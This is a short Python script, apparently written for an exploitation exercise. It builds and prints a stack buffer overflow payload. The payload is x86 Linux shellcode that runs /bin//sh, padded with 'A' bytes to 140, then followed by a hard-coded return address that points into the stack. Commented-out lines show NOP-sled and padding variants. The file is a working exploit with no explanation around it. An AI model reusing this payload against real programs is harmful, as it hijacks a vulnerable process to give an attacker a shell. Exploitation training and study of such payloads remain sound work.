import socket
import sys
import time



def main():
#    buf = b"\x90" * 40;
    buf = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
    buf += b'A' * (140 - 25)
#    buf = b'A' * 140
#    buf = b'\x90' * 140
#    buf += b'abcd'
    buf += b'\x50\xd4\xff\xff'

    sys.stdout.buffer.write(buf)



if __name__ == "__main__":
    main()


